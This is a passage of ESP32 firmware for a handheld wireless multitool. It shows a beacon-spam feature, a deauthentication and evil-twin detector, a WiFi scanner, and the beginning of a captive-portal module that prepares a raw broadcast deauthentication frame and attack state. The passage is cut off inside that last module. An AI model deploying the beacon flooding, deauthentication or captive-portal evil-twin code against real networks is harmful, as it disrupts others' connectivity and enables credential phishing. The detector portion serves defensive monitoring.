        tft.drawBitmap(iconX[activeIcon], iconY, icons[activeIcon], ICON_SIZE, ICON_SIZE, TFT_WHITE);
        animationState = 2;
        lastAnimationTime = millis();
      }
      break;

    case 2:
      if (millis() - lastAnimationTime >= 200) {
        animationState = 3;
        lastAnimationTime = millis();
      }
      break;

    case 3:
      switch (activeIcon) {
        case 0:
          handleLeftButton();
          animationState = 0;
          activeIcon = -1;
          break;
        case 1:
          handleRightButton();
          animationState = 0;
          activeIcon = -1;
          break;
        case 2:
          handleSelectButton();
          if (spam) {
            animationState = 4;
          } else {
            animationState = 0;
            activeIcon = -1;
          }
          break;
        case 3:
          beaconSpam();
          animationState = 0;
          activeIcon = -1;
          break;

         case 4:
           feature_exit_requested = true;
           animationState = 0;
           activeIcon = -1;
          break;
      }
      break;

    case 4:
      if (spam) {
        if (millis() - lastSpamTime >= 50) {
          spammer();

          if (activeIcon == 3) {
            output();
          }
          if (activeIcon == 3) {
            animationState = 5;
          }
          lastSpamTime = millis();
        }
      } else {
        animationState = 0;
        activeIcon = -1;
      }
      break;

    case 5:
      if (millis() - lastSpamTime >= 50) {
        animationState = 0;
        activeIcon = -1;
      }
      break;
  }

  static unsigned long lastTouchCheck = 0;
  const unsigned long touchCheckInterval = 50;

  if (millis() - lastTouchCheck >= touchCheckInterval) {
    int x, y;
    if (feature_active && readTouchXY(x, y)) {
      if (y > STATUS_BAR_Y_OFFSET && y < STATUS_BAR_Y_OFFSET + STATUS_BAR_HEIGHT) {
        for (int i = 0; i < ICON_NUM; i++) {
          if (x > iconX[i] && x < iconX[i] + ICON_SIZE) {
            if (icons[i] != NULL && animationState == 0) {

              if (i == 4) {
                feature_exit_requested = true;
              } else {

                tft.drawBitmap(iconX[i], iconY, icons[i], ICON_SIZE, ICON_SIZE, TFT_BLACK);
                animationState = 1;
                activeIcon = i;
                lastAnimationTime = millis();
              }
            }
            break;
          }
        }
      }
    }
    lastTouchCheck = millis();
  }
}

void beaconSpamSetup() {

  tft.fillScreen(TFT_BLACK);

  setupTouchscreen();

  tft.setTextFont(1);
  tft.setTextSize(1);
  tft.setTextColor(TFT_YELLOW, TFT_BLACK);
  tft.setCursor(2, 30 + y_offset);

  esp_err_t err;
  wifi_init_config_t cfg = WIFI_INIT_CONFIG_DEFAULT();
  err = esp_wifi_init(&cfg);
  if (err != ESP_OK) Serial.printf("WiFi init failed: %d\n", err);

  err = esp_wifi_set_storage(WIFI_STORAGE_RAM);
  if (err != ESP_OK) Serial.printf("Storage set failed: %d\n", err);

  err = esp_wifi_set_mode(WIFI_MODE_AP);
  if (err != ESP_OK) Serial.printf("Mode set failed: %d\n", err);

  err = esp_wifi_start();
  if (err != ESP_OK) Serial.printf("WiFi start failed: %d\n", err);

  err = esp_wifi_set_promiscuous(true);
  if (err != ESP_OK) Serial.printf("Promiscuous set failed: %d\n", err);

  pcf.pinMode(BTN_UP, INPUT_PULLUP);
  pcf.pinMode(BTN_DOWN, INPUT_PULLUP);
  pcf.pinMode(BTN_LEFT, INPUT_PULLUP);
  pcf.pinMode(BTN_RIGHT, INPUT_PULLUP);

  tft.print("[!] Press [UP] to start");

  float currentBatteryVoltage = readBatteryVoltage();
  drawStatusBar(currentBatteryVoltage, true);

  lastSpamChannel = 0xFF;
  lastSpamState   = !spam;

  uiDrawn = false;
  tft.fillRect(0, 20, 120, 16, DARK_GRAY);
}

void beaconSpamLoop() {

  if (feature_active && isButtonPressed(BTN_SELECT)) {
    feature_exit_requested = true;
    return;
  }

  runUI();
  updateStatusBar();

  tft.drawLine(0, 19, 240, 19, TFT_WHITE);

  btnLeftPress = !pcf.digitalRead(BTN_LEFT);
  btnRightPress = !pcf.digitalRead(BTN_RIGHT);
  btnSelectPress = !pcf.digitalRead(BTN_UP);

  delay(10);

  if (btnLeftPress) {
    handleLeftButton();
    delay(200);
  }
  if (btnRightPress) {
    handleRightButton();
    delay(200);
  }
  if (btnSelectPress) {
    handleSelectButton();
    delay(200);
  }

  if (lastSpamChannel != spamchannel || lastSpamState != spam) {
    tft.setTextFont(1);
    tft.fillRect(35, 20, 95, 16, DARK_GRAY);
    tft.setTextColor(TFT_WHITE, DARK_GRAY);
    tft.setTextSize(1);

    tft.setCursor(35, 24);
    tft.print("Ch:");
    tft.print(spamchannel);

    tft.setCursor(70, 24);
    tft.print(spam ? "Enabled " : "Disabled");

    lastSpamChannel = spamchannel;
    lastSpamState   = spam;
  }

  while (spam) {
    runUI();
    if (feature_exit_requested) {
      spam = false;
      break;
    }

    spammer();

    if (btnSelectPress) {
      output();
    }

    if (pcf.digitalRead(BTN_UP)) {
      delay(50);
      break;
    }
  }
}
}

namespace DeauthDetect {

#define SCREEN_HEIGHT 280
#define LINE_HEIGHT 12
#define MAX_LINES (SCREEN_HEIGHT / LINE_HEIGHT)

#define MAX_NETWORKS 50
#define MAX_CHANNELS 14
#define MAX_SSID_LENGTH 8

#define SCREEN_WIDTH  240
#define SCREENHEIGHT 320
#define STATUS_BAR_Y_OFFSET 20
#define STATUS_BAR_HEIGHT 16
#define ICON_SIZE 16
#define ICON_NUM 2

bool stopScan = false;
bool exitMode = false;

String terminalBuffer[MAX_LINES];
uint16_t colorBuffer[MAX_LINES];
int lineIndex = 0;

int deauth[MAX_NETWORKS] = {0};
String ssidLists[MAX_NETWORKS];
uint8_t macList[MAX_NETWORKS][6];

TaskHandle_t wifiScanTaskHandle = NULL;
TaskHandle_t uiTaskHandle = NULL;
TaskHandle_t statusBarTaskHandle = NULL;

SemaphoreHandle_t tftSemaphore;

static int iconX[ICON_NUM] = {210, 10};
static int iconY = STATUS_BAR_Y_OFFSET;
static const unsigned char* icons[ICON_NUM] = {
  bitmap_icon_power,
  bitmap_icon_go_back
};

void scrollTerminal() {
  for (int i = 0; i < MAX_LINES - 1; i++) {
    terminalBuffer[i] = terminalBuffer[i + 1];
    colorBuffer[i] = colorBuffer[i + 1];
  }
}

void displayPrint(String text, uint16_t color, bool extraSpace = false) {
  if (lineIndex >= MAX_LINES - 1) {
    scrollTerminal();
    lineIndex = MAX_LINES - 1;
  }

  terminalBuffer[lineIndex] = text;
  colorBuffer[lineIndex] = color;
  lineIndex++;

  if (extraSpace && lineIndex < MAX_LINES) {
    terminalBuffer[lineIndex] = "";
    colorBuffer[lineIndex] = TFT_WHITE;
    lineIndex++;
  }

  for (int i = 0; i < lineIndex; i++) {
    int yPos = i * LINE_HEIGHT + 45;
    tft.drawLine(0, 19, 240, 19, TFT_WHITE);
    tft.fillRect(5, yPos, tft.width() - 10, LINE_HEIGHT, TFT_BLACK);
    tft.setTextColor(colorBuffer[i], TFT_BLACK);
    tft.setCursor(5, yPos);
    tft.print(terminalBuffer[i]);
  }
}

void checkButtonPress() {
  if (!pcf.digitalRead(BTN_UP)) {
    vTaskDelay(200 / portTICK_PERIOD_MS);
    if (!stopScan) {
      stopScan = true;
      xSemaphoreTake(tftSemaphore, portMAX_DELAY);
      displayPrint("[!] Scanning Stopped", UI_WARN, true);
      displayPrint("[!] Press [Select] to Exit", UI_WARN, false);
      xSemaphoreGive(tftSemaphore);
    } else {
      exitMode = true;
    }
  }
}

void snifferCallback(void* buf, wifi_promiscuous_pkt_type_t type) {
  if (stopScan || exitMode) return;

  wifi_promiscuous_pkt_t* packet = (wifi_promiscuous_pkt_t*) buf;
  uint8_t* payload = packet->payload;

  if (type == WIFI_PKT_MGMT) {
    uint8_t frameType = payload[0];

    if (frameType == 0xC0) {
      uint8_t senderMAC[6];
      memcpy(senderMAC, payload + 10, 6);

      for (int i = 0; i < MAX_NETWORKS; i++) {
        if (memcmp(senderMAC, macList[i], 6) == 0) {
          deauth[i]++;
          xSemaphoreTake(tftSemaphore, portMAX_DELAY);
          displayPrint("[!] Deauth Attack on: " + ssidLists[i], UI_WARN, true);
          xSemaphoreGive(tftSemaphore);
          break;
        }
      }
    }
  }
}

void analyzeNetworks(int n) {
  xSemaphoreTake(tftSemaphore, portMAX_DELAY);
  displayPrint("[*] Checking for Suspicious Networks", TFT_CYAN, true);
  xSemaphoreGive(tftSemaphore);

  for (int i = 0; i < n; i++) {
    checkButtonPress();
    if (exitMode) return;

    bool isDuplicate = false;
    bool isHidden = (ssidLists[i] == "");
    bool isWeirdChannel = WiFi.channel(i) > 13;

    for (int j = 0; j < n; j++) {
      if (i != j && ssidLists[i] == ssidLists[j] && memcmp(macList[i], macList[j], 6) != 0) {
        isDuplicate = true;
        break;
      }
    }

    if (isHidden) {
      xSemaphoreTake(tftSemaphore, portMAX_DELAY);
      displayPrint("[!] Hidden SSID Detected!", TFT_YELLOW, true);
      xSemaphoreGive(tftSemaphore);
    }
    if (isDuplicate) {
      xSemaphoreTake(tftSemaphore, portMAX_DELAY);
      displayPrint("[!] Evil Twin: " + ssidLists[i], TFT_YELLOW, true);
      xSemaphoreGive(tftSemaphore);
    }
    if (isWeirdChannel) {
      xSemaphoreTake(tftSemaphore, portMAX_DELAY);
      displayPrint("[!] Non-Standard Channel: " + String(WiFi.channel(i)), TFT_YELLOW, true);
      xSemaphoreGive(tftSemaphore);
    }

    if (deauth[i] > 5) {
      xSemaphoreTake(tftSemaphore, portMAX_DELAY);
      displayPrint("[!!!] HIGH DEAUTH ATTACK on " + ssidLists[i] + " (" + String(deauth[i]) + " attacks)", UI_WARN, true);
      xSemaphoreGive(tftSemaphore);
    }
  }
}

void scanWiFiTask(void *param) {
  while (1) {
    checkButtonPress();
    if (exitMode) {
      vTaskDelay(10 / portTICK_PERIOD_MS);
      break;
    }
    if (stopScan) {
      vTaskDelay(10 / portTICK_PERIOD_MS);
      continue;
    }

    xSemaphoreTake(tftSemaphore, portMAX_DELAY);
    displayPrint("[*] Scanning WiFi networks", TFT_CYAN, true);
    xSemaphoreGive(tftSemaphore);

    int n = WiFi.scanNetworks();
    if (exitMode) {
      vTaskDelay(10 / portTICK_PERIOD_MS);
      break;
    }
    if (stopScan) {
      vTaskDelay(10 / portTICK_PERIOD_MS);
      continue;
    }

    for (int i = 0; i < n && i < MAX_NETWORKS; i++) {
      String fullSSID = WiFi.SSID(i);
      ssidLists[i] = fullSSID.substring(0, MAX_SSID_LENGTH);
      const uint8_t *bssid = WiFi.BSSID(i);
      memcpy(macList[i], bssid, 6);

      xSemaphoreTake(tftSemaphore, portMAX_DELAY);
      displayPrint("[+] " + ssidLists[i] + (fullSSID.length() > MAX_SSID_LENGTH ? "..." : "") +
                   " | CH: " + String(WiFi.channel(i)) +
                   " | RSSI: " + String(WiFi.RSSI(i)), TFT_WHITE);
      xSemaphoreGive(tftSemaphore);

      if (exitMode) {
        vTaskDelay(10 / portTICK_PERIOD_MS);
        break;
      }
      if (stopScan) {
        vTaskDelay(10 / portTICK_PERIOD_MS);
        break;
      }
    }
    analyzeNetworks(n);
    vTaskDelay(5000 / portTICK_PERIOD_MS);
  }
  wifiScanTaskHandle = NULL;
  vTaskDelete(NULL);
}

static bool uiDrawn = false;

void runUI() {

    tft.drawLine(0, 19, 240, 19, TFT_WHITE);

    static const unsigned char* icons[ICON_NUM] = {
        bitmap_icon_start,
        bitmap_icon_go_back
    };

    if (!uiDrawn) {
        tft.setTextFont(1);
        tft.fillRect(0, 20, 140, 16, DARK_GRAY);
        tft.setTextColor(TFT_WHITE);
        tft.setTextSize(1);
        tft.setCursor(35, 24);
        tft.print("Scanning WiFi");

        tft.drawLine(0, 19, 240, 19, TFT_WHITE);
        tft.fillRect(140, STATUS_BAR_Y_OFFSET, SCREEN_WIDTH - 140, STATUS_BAR_HEIGHT, DARK_GRAY);

        for (int i = 0; i < ICON_NUM; i++) {
            if (icons[i] != NULL) {
                tft.drawBitmap(iconX[i], iconY, icons[i], ICON_SIZE, ICON_SIZE, TFT_WHITE);
            }
        }
        tft.drawLine(0, STATUS_BAR_Y_OFFSET + STATUS_BAR_HEIGHT, SCREEN_WIDTH, STATUS_BAR_Y_OFFSET + STATUS_BAR_HEIGHT, ORANGE);
        uiDrawn = true;
    }

    static unsigned long lastAnimationTime = 0;
    static int animationState = 0;
    static int activeIcon = -1;

    if (animationState > 0 && millis() - lastAnimationTime >= 150) {
        if (animationState == 1) {
            tft.drawBitmap(iconX[activeIcon], iconY, icons[activeIcon], ICON_SIZE, ICON_SIZE, TFT_WHITE);
            animationState = 2;

            switch (activeIcon) {
                case 0:
                    displayPrint("[!] Scanning Stopped", UI_WARN, true);
                    displayPrint("[!] Press [Select] to Exit", UI_WARN, false);
                    stopScan = true;
                    animationState = 0;
                    activeIcon = -1;
                    break;
            }
        } else if (animationState == 2) {
            animationState = 0;
            activeIcon = -1;
        }
        lastAnimationTime = millis();
    }

    static unsigned long lastTouchCheck = 0;
    const unsigned long touchCheckInterval = 50;

    if (millis() - lastTouchCheck >= touchCheckInterval) {
        int x, y;
        if (feature_active && readTouchXY(x, y)) {
            if (y > STATUS_BAR_Y_OFFSET && y < STATUS_BAR_Y_OFFSET + STATUS_BAR_HEIGHT) {
                for (int i = 0; i < ICON_NUM; i++) {
                    if (x > iconX[i] && x < iconX[i] + ICON_SIZE) {
                        if (icons[i] != NULL && animationState == 0) {

                            if (i == 1) {
                                displayPrint("[!] Scanning Stopped", UI_WARN, true);
                                stopScan = true;
                                exitMode = true;
                            } else {

                                tft.drawBitmap(iconX[i], iconY, icons[i], ICON_SIZE, ICON_SIZE, TFT_BLACK);
                                animationState = 1;
                                activeIcon = i;
                                lastAnimationTime = millis();
                            }
                        }
                        break;
                    }
                }
            }
        }
        lastTouchCheck = millis();
    }
}

void uiTask(void *param) {
  while (1) {
    xSemaphoreTake(tftSemaphore, portMAX_DELAY);
    runUI();
    xSemaphoreGive(tftSemaphore);
    vTaskDelay(50 / portTICK_PERIOD_MS);
  }
}

void statusBarTask(void *param) {
  while (1) {
    xSemaphoreTake(tftSemaphore, portMAX_DELAY);
    updateStatusBar();
    xSemaphoreGive(tftSemaphore);
    vTaskDelay(1000 / portTICK_PERIOD_MS);
  }
}

void deauthdetectSetup() {
  WiFi.mode(WIFI_STA);
  WiFi.disconnect();

  esp_wifi_set_promiscuous(true);
  esp_wifi_set_promiscuous_rx_cb(snifferCallback);

  tft.fillScreen(TFT_BLACK);

  float currentBatteryVoltage = readBatteryVoltage();
  drawStatusBar(currentBatteryVoltage, true);

  pcf.pinMode(BTN_UP, INPUT_PULLUP);
  pcf.pinMode(BTN_DOWN, INPUT_PULLUP);
  pcf.pinMode(BTN_LEFT, INPUT_PULLUP);
  pcf.pinMode(BTN_RIGHT, INPUT_PULLUP);

  setupTouchscreen();

  tftSemaphore = xSemaphoreCreateMutex();

  xTaskCreate(scanWiFiTask, "WiFiScanTask", 4096, NULL, 1, &wifiScanTaskHandle);
  xTaskCreate(uiTask, "UITask", 4096, NULL, 2, &uiTaskHandle);
  xTaskCreate(statusBarTask, "StatusBarTask", 2048, NULL, 1, &statusBarTaskHandle);

   uiDrawn = false;
}

void deauthdetectLoop() {

  if (feature_active && isButtonPressed(BTN_SELECT)) {
    stopScan = true;
    exitMode = true;
  }

  checkButtonPress();

  if (stopScan || exitMode) {

    if (wifiScanTaskHandle != NULL) {
      vTaskDelete(wifiScanTaskHandle);
      wifiScanTaskHandle = NULL;
    }
    if (uiTaskHandle != NULL) {
      vTaskDelete(uiTaskHandle);
      uiTaskHandle = NULL;
    }
    if (statusBarTaskHandle != NULL) {
      vTaskDelete(statusBarTaskHandle);
      statusBarTaskHandle = NULL;
    }

    esp_wifi_set_promiscuous(false);
    WiFi.disconnect();
    stopScan = false;
    exitMode = false;
    lineIndex = 0;
    delay(10);

    feature_exit_requested = true;
  }
}
}

namespace WifiScan {

#define TFT_WIDTH 240
#define TFT_HEIGHT 320

#define SCREEN_WIDTH  240
#define SCREENHEIGHT 320
#define STATUS_BAR_Y_OFFSET 20
#define STATUS_BAR_HEIGHT 16
#define ICON_SIZE 16
#define ICON_NUM 2

int currentIndex = 0;
int listStartIndex = 0;
bool isDetailView = false;
bool isScanning = false;
bool exitRequested = false;

static TaskHandle_t bgScanTaskHandle = nullptr;
static volatile bool bgHasResults = false;
static volatile uint32_t bgLastScanMs = 0;
static const uint32_t BG_SCAN_INTERVAL_MS = 15000;

static const uint32_t BG_BOOT_GRACE_MS = 6000;
static volatile bool bgScanRunning = false;
static uint32_t bgBootMs = 0;

static void bgWifiScanTask(void* ) {
  for (;;) {
    const uint32_t now = millis();
    if (bgBootMs == 0) bgBootMs = now;

    const bool idleOk = (now - bgBootMs) > BG_BOOT_GRACE_MS;
    if (settings().autoWifiScan && idleOk && !feature_active && !in_sub_menu) {

      if (!bgScanRunning) {
        WiFi.mode(WIFI_STA);
        WiFi.disconnect();
        WiFi.scanDelete();
        int ret = WiFi.scanNetworks(true, true);

        bgScanRunning = (ret == WIFI_SCAN_RUNNING);
        if (ret >= 0) {

          bgHasResults = true;
          bgLastScanMs = now;
          vTaskDelay(BG_SCAN_INTERVAL_MS / portTICK_PERIOD_MS);
        } else if (!bgScanRunning) {

          vTaskDelay(2000 / portTICK_PERIOD_MS);
        } else {
          vTaskDelay(250 / portTICK_PERIOD_MS);
        }
      } else {
        int n = WiFi.scanComplete();
        if (n >= 0) {
          bgHasResults = true;
          bgLastScanMs = now;
          bgScanRunning = false;
          vTaskDelay(BG_SCAN_INTERVAL_MS / portTICK_PERIOD_MS);
        } else if (n == WIFI_SCAN_FAILED) {
          bgScanRunning = false;
          WiFi.scanDelete();
          vTaskDelay(2000 / portTICK_PERIOD_MS);
        } else {

          vTaskDelay(250 / portTICK_PERIOD_MS);
        }
      }
    } else {

      bgScanRunning = false;
      vTaskDelay(1000 / portTICK_PERIOD_MS);
    }
  }
}

void startBackgroundScanner() {
  if (bgScanTaskHandle != nullptr) return;
  xTaskCreatePinnedToCore(
    bgWifiScanTask,
    "bgWifiScan",
    4096,
    nullptr,
    1,
    &bgScanTaskHandle,
    0
  );
}

int getLastCount() {

  if (!settings().autoWifiScan) return 0;
  int n = WiFi.scanComplete();
  return (n < 0) ? 0 : n;
}

unsigned long scan_StartTime = 0;
const unsigned long scanTimeout = 2000;
unsigned long lastButtonPress = 0;
const unsigned long debounceTime = 200;

#define MAX_SSID_LENGTH 10
#define LIST_TOP (STATUS_BAR_Y_OFFSET + STATUS_BAR_HEIGHT + 15)
#define LIST_ITEM_HEIGHT 18
#define MAX_VISIBLE_ITEMS 14

static bool uiDrawn = false;

static int iconX[ICON_NUM] = {210, 10};
static const unsigned char* icons[ICON_NUM] = {
  bitmap_icon_undo,
  bitmap_icon_go_back
};

void displayWiFiList(bool fullRedraw = false) {
  uiDrawn = false;
  int networkCount = WiFi.scanComplete();

  if (fullRedraw || networkCount <= 0) {
    tft.fillRect(0, STATUS_BAR_Y_OFFSET + STATUS_BAR_HEIGHT, TFT_WIDTH, TFT_HEIGHT - (STATUS_BAR_Y_OFFSET + STATUS_BAR_HEIGHT), TFT_BLACK);

    tft.fillRect(0, 20, 140, 16, DARK_GRAY);
    tft.setTextColor(TFT_WHITE);
    tft.setCursor(35, 24);
    tft.print("WiFi Networks:");

    if (networkCount <= 0) {
      tft.fillRect(0, 20, 140, 16, DARK_GRAY);
      tft.setTextColor(TFT_WHITE);
      tft.setCursor(5, 24);
      tft.print("No Networks Found");
      return;
    }

    tft.setTextColor(TFT_WHITE, TFT_BLACK);

    for (int i = 0; i < MAX_VISIBLE_ITEMS; i++) {
      int currentNetworkIndex = i + listStartIndex;
      if (currentNetworkIndex >= networkCount) break;

      String fullSSID = WiFi.SSID(currentNetworkIndex);
      String ssid = fullSSID.substring(0, MAX_SSID_LENGTH);
      int rssi = WiFi.RSSI(currentNetworkIndex);
      int yPos = LIST_TOP + i * LIST_ITEM_HEIGHT;

      if (currentNetworkIndex == currentIndex) {
        tft.setTextColor(ORANGE, TFT_BLACK);
        tft.setCursor(10, yPos);
        tft.print("> ");
      } else {
        tft.setTextColor(TFT_WHITE, TFT_BLACK);
        tft.setCursor(10, yPos);
        tft.print("  ");
      }

      tft.setCursor(25, yPos);
      tft.print(ssid);
      if (fullSSID.length() > MAX_SSID_LENGTH) tft.print("...");
      tft.print(" | RSSI: ");
      tft.print(rssi);
    }
  } else {
    for (int i = 0; i < MAX_VISIBLE_ITEMS; i++) {
      int currentNetworkIndex = i + listStartIndex;
      if (currentNetworkIndex >= networkCount) break;

      if (currentNetworkIndex == currentIndex || currentNetworkIndex == currentIndex + 1 || currentNetworkIndex == currentIndex - 1) {
        String fullSSID = WiFi.SSID(currentNetworkIndex);
        String ssid = fullSSID.substring(0, MAX_SSID_LENGTH);
        int rssi = WiFi.RSSI(currentNetworkIndex);
        int yPos = LIST_TOP + i * LIST_ITEM_HEIGHT;

        tft.fillRect(0, yPos - 2, TFT_WIDTH, LIST_ITEM_HEIGHT, TFT_BLACK);

        if (currentNetworkIndex == currentIndex) {
          tft.setTextColor(ORANGE, TFT_BLACK);
          tft.setCursor(10, yPos);
          tft.print("> ");
        } else {
          tft.setTextColor(TFT_WHITE, TFT_BLACK);
          tft.setCursor(10, yPos);
          tft.print("  ");
        }

        tft.setCursor(25, yPos);
        tft.print(ssid);
        if (fullSSID.length() > MAX_SSID_LENGTH) tft.print("...");
        tft.print(" | RSSI: ");
        tft.print(rssi);
      }
    }
  }
}

void displayScanning() {
  uiDrawn = false;
  tft.fillRect(0, 20, 140, 16, DARK_GRAY);
  tft.fillRect(0, 37, 240, 320, TFT_BLACK);

  tft.setTextColor(TFT_WHITE, TFT_BLACK);
  tft.setCursor(10, STATUS_BAR_Y_OFFSET + 25);
  tft.print("[*] Scanning");

  for (int i = 0; i < 2; i++) {
    for (int j = 0; j <= i; j++) {
      tft.print(".");
      delay(500);
    }
  }

  tft.setTextColor(TFT_WHITE, TFT_BLACK);
  tft.setCursor(10, STATUS_BAR_Y_OFFSET + 35);
  tft.print("[+] Scan complete!");

  delay(100);

  tft.setCursor(10, STATUS_BAR_Y_OFFSET + 55);
  tft.print("[+] Wait a moment");
  isScanning = false;
}

void startWiFiScan() {
  displayScanning();

  scan_StartTime = millis();
  isScanning = true;
  exitRequested = false;

  int numNetworks = WiFi.scanNetworks(false, true);

  isScanning = false;

  if (numNetworks >= 0) {
    bgHasResults = true;
    bgLastScanMs = millis();
  }

  displayWiFiList(true);
}

void displayWiFiDetails() {
  uiDrawn = false;
  tft.fillRect(0, 37, 240, 320, TFT_BLACK);

  String ssid = WiFi.SSID(currentIndex);
  String bssid = WiFi.BSSIDstr(currentIndex);
  int rssi = WiFi.RSSI(currentIndex);
  int channel = WiFi.channel(currentIndex);
  int encryption = WiFi.encryptionType(currentIndex);
  bool isHidden = (ssid.length() == 0);
  int y_shift = 0;

  float signalQuality = constrain(2 * (rssi + 100), 0, 100);
  float estimatedDistance = pow(10.0, (-69.0 - rssi) / (10.0 * 2.0));

  String encryptionType;
  switch (encryption) {
    case WIFI_AUTH_OPEN: encryptionType = "Open"; break;
    case WIFI_AUTH_WEP: encryptionType = "WEP"; break;
    case WIFI_AUTH_WPA_PSK: encryptionType = "WPA"; break;
    case WIFI_AUTH_WPA2_PSK: encryptionType = "WPA2"; break;
    case WIFI_AUTH_WPA_WPA2_PSK: encryptionType = "WPA/WPA2"; break;
    case WIFI_AUTH_WPA2_ENTERPRISE: encryptionType = "WPA2-Ent"; break;
    default: encryptionType = "Unknown"; break;
  }

  tft.fillRect(0, 20, 140, 16, DARK_GRAY);
  tft.setTextColor(TFT_WHITE);
  tft.setCursor(35, 24);
  tft.print("Network Details:");

  tft.setTextColor(TFT_WHITE, TFT_BLACK);
  tft.setTextSize(1);

  tft.setCursor(10, STATUS_BAR_Y_OFFSET + 35 + y_shift);
  tft.print("SSID: "); tft.print(isHidden ? "(Hidden)" : ssid);

  tft.setCursor(10, STATUS_BAR_Y_OFFSET + 55 + y_shift);
  tft.print("BSSID: "); tft.print(bssid);

  tft.setCursor(10, STATUS_BAR_Y_OFFSET + 75 + y_shift);
  tft.print("RSSI: "); tft.print(rssi); tft.print(" dBm");

  tft.setCursor(10, STATUS_BAR_Y_OFFSET + 95 + y_shift);
  tft.print("Signal: "); tft.print(signalQuality); tft.print("%");

  tft.setCursor(10, STATUS_BAR_Y_OFFSET + 115 + y_shift);
  tft.print("Channel: "); tft.print(channel);

  tft.setCursor(10, STATUS_BAR_Y_OFFSET + 135 + y_shift);
  tft.print("Encryption: "); tft.print(encryptionType);

  tft.setCursor(10, STATUS_BAR_Y_OFFSET + 155 + y_shift);
  tft.print("Est. Distance: "); tft.print(estimatedDistance, 1); tft.print("m");
}

void handleButton() {
  unsigned long currentMillis = millis();
  if (currentMillis - lastButtonPress < debounceTime) return;

  bool updated = false;

  if (!pcf.digitalRead(BTN_UP)) {
    if (!isDetailView && currentIndex > 0) {
      currentIndex--;
      delay(200);
      if (currentIndex < listStartIndex) listStartIndex--;
      updated = true;
    }
    lastButtonPress = currentMillis;
  }

  if (!pcf.digitalRead(BTN_DOWN)) {
    if (!isDetailView && currentIndex < WiFi.scanComplete() - 1) {
      currentIndex++;
      delay(200);
      if (currentIndex >= listStartIndex + MAX_VISIBLE_ITEMS) listStartIndex++;
      updated = true;
    }
    lastButtonPress = currentMillis;
  }

  if (!pcf.digitalRead(BTN_RIGHT)) {
    delay(200);
    if (!isScanning) {
      isDetailView = !isDetailView;
      updated = true;
    }
    lastButtonPress = currentMillis;
  }

  if (!pcf.digitalRead(BTN_LEFT)) {
    delay(200);
    if (isDetailView) {
      isDetailView = false;
    } else if (!isScanning) {
      startWiFiScan();
    }
    updated = true;
    lastButtonPress = currentMillis;
  }

  if (updated) {
    if (isDetailView) displayWiFiDetails();
    else displayWiFiList();
  }
}

void runUI() {

    static int iconY = STATUS_BAR_Y_OFFSET;

    if (!uiDrawn) {
        tft.drawLine(0, 19, 240, 19, TFT_WHITE);
        tft.fillRect(140, STATUS_BAR_Y_OFFSET, SCREEN_WIDTH - 140, STATUS_BAR_HEIGHT, DARK_GRAY);

        for (int i = 0; i < ICON_NUM; i++) {
            if (icons[i] != NULL) {
                tft.drawBitmap(iconX[i], iconY, icons[i], ICON_SIZE, ICON_SIZE, TFT_WHITE);
            }
        }
        tft.drawLine(0, STATUS_BAR_Y_OFFSET + STATUS_BAR_HEIGHT, SCREEN_WIDTH, STATUS_BAR_Y_OFFSET + STATUS_BAR_HEIGHT, ORANGE);
        uiDrawn = true;
    }

    static unsigned long lastAnimationTime = 0;
    static int animationState = 0;
    static int activeIcon = -1;

    if (animationState > 0 && millis() - lastAnimationTime >= 150) {
        if (animationState == 1) {
            tft.drawBitmap(iconX[activeIcon], iconY, icons[activeIcon], ICON_SIZE, ICON_SIZE, TFT_WHITE);
            animationState = 2;

            switch (activeIcon) {
                case 0:
                    if (!isScanning) {
                        startWiFiScan();
                    }
                    break;
            }
        } else if (animationState == 2) {
            animationState = 0;
            activeIcon = -1;
        }
        lastAnimationTime = millis();
    }

    static unsigned long lastTouchCheck = 0;
    const unsigned long touchCheckInterval = 50;

    if (millis() - lastTouchCheck >= touchCheckInterval) {
        int x, y;
        if (feature_active && readTouchXY(x, y)) {
            if (y > STATUS_BAR_Y_OFFSET && y < STATUS_BAR_Y_OFFSET + STATUS_BAR_HEIGHT) {
                for (int i = 0; i < ICON_NUM; i++) {
                    if (x > iconX[i] && x < iconX[i] + ICON_SIZE) {
                        if (icons[i] != NULL && animationState == 0) {

                            if (i == 1) {
                                feature_exit_requested = true;
                            } else {

                                tft.drawBitmap(iconX[i], iconY, icons[i], ICON_SIZE, ICON_SIZE, TFT_BLACK);
                                animationState = 1;
                                activeIcon = i;
                                lastAnimationTime = millis();
                            }
                        }
                        break;
                    }
                }
            }
        }
        lastTouchCheck = millis();
    }
}

void wifiscanSetup() {

  tft.fillScreen(TFT_BLACK);
  tft.setTextColor(TFT_WHITE, TFT_BLACK);
  tft.setTextSize(1);
  tft.fillRect(0, 20, 140, 16, DARK_GRAY);

  uiDrawn = false;

  pcf.pinMode(BTN_UP, INPUT_PULLUP);
  pcf.pinMode(BTN_DOWN, INPUT_PULLUP);
  pcf.pinMode(BTN_RIGHT, INPUT_PULLUP);
  pcf.pinMode(BTN_LEFT, INPUT_PULLUP);

  setupTouchscreen();

  WiFi.mode(WIFI_STA);
  WiFi.disconnect();

  int existing = WiFi.scanComplete();
  if (existing >= 0 && bgHasResults) {
    displayWiFiList(true);
  } else {
    startWiFiScan();
  }

  float currentBatteryVoltage = readBatteryVoltage();
  drawStatusBar(currentBatteryVoltage, true);
  runUI();
}

void wifiscanLoop() {

  if (feature_active && isButtonPressed(BTN_SELECT)) {
    feature_exit_requested = true;
    return;
  }

  tft.drawLine(0, 19, 240, 19, TFT_WHITE);
  static bool lastDetailView = false;
  static bool lastScanning = true;

  handleButton();
  runUI();
  updateStatusBar();

  if (isScanning) {
    if (!lastScanning) {
      displayScanning();
      lastScanning = true;
    }
  } else if (!isDetailView) {
    if (lastDetailView || lastScanning) {
      displayWiFiList(true);
    }
    lastDetailView = false;
    lastScanning = false;
  } else {
    if (!lastDetailView) {
      displayWiFiDetails();
    }
    lastDetailView = true;
    }
  }
}

namespace CaptivePortal {

const char* default_ssid = "ESP32DIV_AP";
char custom_ssid[32] = "ESP32DIV_AP";
const char* password = NULL;

static uint8_t ap_channel = 1;

static bool cp_deauth_active = false;
static wifi_ap_record_t cp_target_ap;
static uint8_t cp_target_channel;
static uint32_t cp_deauth_packet_count = 0;
static uint32_t cp_deauth_success_count = 0;
static unsigned long cp_last_deauth_time = 0;

static uint8_t cp_deauth_frame_default[26] = {
    0xC0, 0x00,
    0x00, 0x00,
    0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF,
    0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC,
    0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC,
    0x00, 0x00,
    0x01, 0x00
};
